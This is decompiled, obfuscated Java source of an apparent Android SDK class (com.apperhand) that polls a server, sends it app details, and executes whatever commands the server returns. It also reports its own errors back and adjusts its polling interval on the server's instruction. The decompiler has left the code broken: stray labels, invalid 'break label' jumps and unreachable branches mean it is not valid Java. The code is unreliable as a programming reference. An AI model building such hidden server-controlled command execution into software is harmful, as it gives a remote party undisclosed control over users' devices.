package com.apperhand.device.a;

import com.apperhand.common.dto.Command;
import com.apperhand.common.dto.Command.Commands;
import com.apperhand.common.dto.protocol.CommandsRequest;
import com.apperhand.common.dto.protocol.CommandsResponse;
import com.apperhand.device.a.b.h;
import com.apperhand.device.a.b.k;
import com.apperhand.device.a.d.c;
import com.apperhand.device.a.d.c.a;
import com.apperhand.device.a.d.d;
import com.apperhand.device.a.d.e;
import com.apperhand.device.a.d.f;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.UUID;

public abstract class b
{
  protected static final String c = b.class.getSimpleName();
  private long a;
  private String b = null;
  private boolean d;
  private boolean e;
  private a f;

  public b(a parama, boolean paramBoolean)
  {
    this.f = parama;
    this.a = 60L;
    this.d = paramBoolean;
    this.e = true;
  }

  private void a(Throwable paramThrowable)
  {
    this.f.a().a(c.a.c, c, "Unexpected error!!! ", paramThrowable);
    if ((paramThrowable instanceof f) && (!(((f)paramThrowable).a())));
    while (true)
    {
      return;
      k localk = new k(this, this.f, UUID.randomUUID().toString(), Command.Commands.UNEXPECTED_EXCEPTION, paramThrowable);
      try
      {
        localk.a(null);
      }
      catch (f localf)
      {
        this.f.a().a(c.a.c, c, "Error sending unexpected exception!!!", localf);
      }
    }
  }

  public void a()
  {
    while (true)
    {
      CommandsResponse localCommandsResponse;
      try
      {
        this.b = b();
        CommandsRequest localCommandsRequest = new CommandsRequest();
        Collection localCollection = this.f.i().b();
        if (!(Boolean.valueOf(this.f.i().a("ACTIVATED", "false")).booleanValue()))
          break label300;
        bool = false;
        if (localCollection != null)
        {
          int i = localCollection.size();
          bool = false;
          if (i > 0)
            break label300;
        }
        localCommandsRequest.setNeedSpecificParameters(bool);
        if (!(this.d))
          break label261;
        str = "first time";
        localCommandsRequest.setInitiationType(str);
        localCommandsRequest.setApplicationDetails(this.f.j());
        localCommandsRequest.setCurrentInterval(c());
        localCommandsResponse = (CommandsResponse)this.f.b().a(localCommandsRequest, Command.Commands.COMMANDS, CommandsResponse.class);
        if (localCommandsResponse.isValidResponse())
          break label268;
        b(86400L);
        this.f.a().a(c.a.c, c, "Server Error in getCommands. Next command = [86400] seconds");
        localObject = null;
        if (localObject == null)
          break label260;
        d();
        Iterator localIterator = localObject.iterator();
        com.apperhand.device.a.b.b localb;
        do
        {
          if (!(localIterator.hasNext()))
            break label260;
          localb = h.a(this, (Command)localIterator.next(), this.f);
        }
        while (localb == null);
        label260: localb.c();
      }
      catch (Throwable localThrowable)
      {
        a(localThrowable);
        return;
      }
      label261: String str = "schedule";
      continue;
      label268: b(localCommandsResponse.getCommandsInterval());
      b(e.a(localCommandsResponse));
      List localList = localCommandsResponse.getCommands();
      Object localObject = localList;
      continue;
      label300: boolean bool = true;
    }
  }

  protected abstract void a(long paramLong);

  public final void a(Command paramCommand)
  {
    try
    {
      com.apperhand.device.a.b.b localb = h.a(this, paramCommand, this.f);
      if (localb != null)
        localb.c();
      return;
    }
    catch (Throwable localThrowable)
    {
      a(localThrowable);
    }
  }

  public final void a(Command paramCommand, Map<String, Object> paramMap)
  {
    try
    {
      com.apperhand.device.a.b.b localb = h.a(this, paramCommand, this.f);
      if (localb != null)
        localb.a(paramMap);
      return;
    }
    catch (Throwable localThrowable)
    {
      a(localThrowable);
    }
  }

  protected abstract void a(String paramString);

  protected abstract String b();

  public final void b(long paramLong)
  {
    if (paramLong <= 0L)
      return;
    this.a = paramLong;
    a(paramLong);
  }

  public final void b(String paramString)
  {
    if (paramString != null)
      if (paramString.length() <= 0)
        break label25;
    while (true)
    {
      this.b = paramString;
      a(this.b);
      return;
      label25: paramString = null;
    }
  }

  protected abstract long c();

  protected abstract void d();

  public final long e()
  {
    return this.a;
  }

  public final String f()
  {
    return this.b;
  }

  public final void g()
  {
    this.e = false;
  }

  public final boolean h()
  {
    return this.e;
  }
}

/* Location:           C:\Users\changeme\Desktop\browserStartApp\decompilebrowser\
 * Qualified Name:     com.apperhand.device.a.b
 * JD-Core Version:    0.5.3
 */